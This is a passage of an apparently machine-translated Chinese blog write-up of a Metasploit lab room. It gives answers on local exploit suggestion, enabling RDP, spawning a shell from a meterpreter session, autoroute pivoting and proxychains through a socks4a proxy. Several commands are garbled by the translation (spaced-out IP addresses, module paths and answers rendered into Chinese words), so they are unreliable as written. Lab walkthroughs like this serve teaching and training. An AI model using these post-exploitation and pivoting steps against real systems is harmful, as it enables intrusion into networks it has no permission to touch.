ka b kb kc kd ke kf kg kh ki mm kk kl km mn ko kp kq mo ks kt ku kv ij bi translated">运行post/multi/recon/local _ exploit _ suggester</p></blockquote><p id="b2c1" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">#12最后，让我们试着强迫RDP上场。因为我们不是管理员，所以这不起作用，但是，这是一个需要了解的有趣命令:</p><blockquote class="mj mk ml"><p id="3cac" class="jy jz mi ka b kb kc kd ke kf kg kh ki mm kk kl km mn ko kp kq mo ks kt ku kv ij bi translated">运行post/windows/manage/enable_rdp</p></blockquote><p id="b78c" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">#13一个额外的小问题，我们可以在我们的meterpreter会话中运行什么命令来生成一个正常的系统shell？</p><blockquote class="mj mk ml"><p id="3831" class="jy jz mi ka b kb kc kd ke kf kg kh ki mm kk kl km mn ko kp kq mo ks kt ku kv ij bi translated">壳</p></blockquote></div><div class="ab cl kx ky hu kz" role="separator"><span class="la bw bk lb lc ld"/><span class="la bw bk lb lc ld"/><span class="la bw bk lb lc"/></div><div class="ij ik il im in"><h1 id="07bf" class="le lf iq bd lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb bi translated"><strong class="ak">[任务7]让思科骄傲</strong></h1><p id="850c" class="pw-post-body-paragraph jy jz iq ka b kb md kd ke kf me kh ki kj mf kl km kn mg kp kq kr mh kt ku kv ij bi translated">最后，让我们看看Metasploit中可用的自动路由选项。虽然我们的受害者机器可能没有多个网络接口(NIC ),但我们将通过我们的受害者进行旋转运动，就好像它可以访问额外的网络一样。</p><p id="95ec" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">#1让我们继续运行命令“run autoroute -h ”,这将弹出autoroute的帮助菜单。我们应该运行什么命令来向以下子网添加路由:172.18.1.0/24？在您的答案中使用-n标志。</p><blockquote class="mj mk ml"><p id="3903" class="jy jz mi ka b kb kc kd ke kf kg kh ki mm kk kl km mn ko kp kq mo ks kt ku kv ij bi translated">运行autoroute-s 172 . 18 . 1 . 0-n 255 . 255 . 255 . 0</p></blockquote><p id="0e26" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">#2另外，我们可以在这个会话之外启动一个socks4a代理服务器。设置当前meterpreter会话的背景，并运行命令“search server/socks4a”。socks4a辅助模块的完整路径是什么？</p><blockquote class="mj mk ml"><p id="192a" class="jy jz mi ka b kb kc kd ke kf kg kh ki mm kk kl km mn ko kp kq mo ks kt ku kv ij bi translated">辅助/服务器/插座4a</p></blockquote><p id="98d3" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">#3一旦我们启动了socks服务器，我们就可以修改/etc/proxychains.conf文件来包含我们的新服务器。我们在命令前面加上什么命令(在Metasploit之外),以便通过我们的socks4a服务器用proxychains运行它们？</p><blockquote class="mj mk ml"><p id="e68c" class="jy jz mi ka b kb kc kd ke kf kg kh ki mm kk kl km mn ko kp kq mo ks kt ku kv ij bi translated">代理链</p></blockquote></div><div class="ab cl kx ky hu kz" role="separator"><span class="la bw bk lb lc ld"/><span class="la bw bk lb lc ld"/><span class="la bw bk lb lc"/></div><div class="ij ik il im in"><p id="7f70" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">联系我:<a class="ae kw" href="https://twitter.com/abhiunix" rel="noopener ugc nofollow" target="_blank">推特</a>，</p><p id="e507" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated"><em class="mi">网页:</em><a class="ae kw" href="https://abhiunix.in" rel="noopener ugc nofollow" target="_blank"><em class="mi">https://abhi UNIX . in</em></a></p></div></div>    
</body>
</html>